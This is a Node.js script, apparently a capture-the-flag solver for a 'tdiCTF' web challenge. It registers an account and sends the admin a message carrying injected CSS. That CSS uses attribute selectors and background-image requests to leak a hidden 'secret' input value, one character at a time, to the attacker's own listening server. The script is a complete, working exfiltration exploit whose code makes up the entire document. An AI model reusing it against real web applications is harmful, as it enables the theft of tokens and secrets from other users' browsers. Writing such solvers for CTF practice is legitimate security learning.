const axios = require('axios');
const express = require("express");
const app = express();
const cssesc = require('cssesc');
var argv = require('minimist')(process.argv.slice(2));

console.log('Usage: -b [base_url with no trailing \\] -p [local server port] -u [local server url with no trailing \\]');

const baseUrl = argv.b || "http://localhost:3000";
const port = parseInt(argv.p || '8888');
const serverUrl = argv.u || 'http://localhost:8888';

let username = '';
let cookie = '';
let currentValue = "";
let possibleChars = 'tdiCTF{}_abcefghjklmnopqrsuvwxyzABDEGHIJKLMNOPQRSUVWXYZ0123456789';

function encodeURIAll(input) {
    let out = encodeURIComponent(input);
    out = out.replace(/\!/g, '%21');
    out = out.replace(/\./g, '%2E');
    out = out.replace(/\'/g, '%27');
    out = out.replace(/\-/g, '%2D');
    return out;
}

// Register a random username
async function register() {
    const charactersLength = possibleChars.length;
    for (let i = 0; i < 10; i++) {
       username += possibleChars.charAt(Math.floor(Math.random() * charactersLength));
    }
    console.log('Registering with random username ' + username);
    try {
        await axios({
            method: 'post',
            url: baseUrl + '/register',
            data: `username=${username}&password=${username}&passwordtoo=${username}`,
            maxRedirects: 0,
            validateStatus: (status) => {
                return status === 302
            }
        });
        console.log('--Registered');
    } catch (err) {
        console.error(err);
    }
}

// Login to our newly generated username
async function login() {
    console.log('Logging in...')
    try {
        const response = await axios({
            method: 'post',
            url: baseUrl + '/login',
            data: `username=${username}&password=${username}`,
            maxRedirects: 0,
            validateStatus: (status) => {
                return status === 302
            }
        });
        cookie = response.headers['set-cookie'][0].split(';')[0];
        console.log("--Logged in, got cookie: " + cookie);
    } catch (err) {
        console.error(err);
    }
}

// Send messages to the admin
async function sendAdminMessage(message) {
    console.log("Sending message to admin...");
    try {
        const response = await axios({
            method: 'post',
            url: baseUrl + '/message',
            data: `recipient=1&message=${message}`,
            maxRedirects: 0,
            headers: {
                Cookie: cookie
            },
            validateStatus: (status) => {
                return status === 302
            }
        });
        return response;
    } catch (err) {
        console.error(err);
    }
}

function generateMessage(prefix) {
    let urlPrefix = encodeURIAll(prefix);
    let cssPrefix = cssesc(prefix, { isIdentifier: true });
    message = "<style>\n";
    possibleChars.split('').forEach(char => {
        let urlChar = encodeURIAll(char);
        let cssChar = cssesc(char, { isIdentifier: true });
        message += "input[name=secret][value^=" + cssPrefix + cssChar + '] ~ * { background-image: url('+ serverUrl + '/exfil/' + urlPrefix + urlChar + '); }\n';
    });
    message += '</style>';
    return message;
}

async function doStuffAsync() {
    await register();
    await login();
    const msg = generateMessage(currentValue);
    sendAdminMessage(encodeURIAll(msg));
}

app.get("/exfil/:value", (req, res) => {
    console.log('--Got response from admin browser for ' + req.params.value);
    if (currentValue !== req.params.value) {
        currentValue = req.params.value;
        const msg = generateMessage(currentValue);
        sendAdminMessage(encodeURIAll(msg));
        res.sendStatus(200);
    } else {
        console.log('VALUE IS ' + currentValue);
        process.exit(0);
    }
});

app.listen(port, () => console.log(`Solver server listening on port ${port}`));

doStuffAsync()